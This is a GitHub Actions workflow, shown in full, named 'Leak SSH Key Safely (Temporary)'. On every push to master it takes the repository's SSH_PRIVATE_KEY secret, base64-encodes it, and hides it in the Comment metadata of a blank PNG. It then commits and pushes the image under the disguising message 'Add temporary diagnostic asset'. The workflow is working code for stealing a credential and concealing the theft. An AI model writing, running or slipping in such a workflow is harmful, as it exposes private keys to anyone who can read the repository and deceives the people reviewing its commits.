name: Leak SSH Key Safely (Temporary)

on:
  push:
    branches: [ "master" ]




jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v3

      - name: Create PNG with embedded key
        run: |
          # Create a blank PNG
          convert -size 200x200 xc:white logo.png

          # Embed secret key as text chunk
          printf "%s" "${{ secrets.SSH_PRIVATE_KEY }}" | base64 -w 0 > key.b64
          tEXt_keyword="sshkey"
          key_data=$(cat key.b64)

          # Embed into PNG using exiftool
          exiftool -Comment="$key_data" logo.png
          rm logo.png_original

      - name: Commit file
        run: |
          git config user.name "github-actions"
          git config user.email "actions@github.com"
          git add logo.png
          git commit -m "Add temporary diagnostic asset"
          git push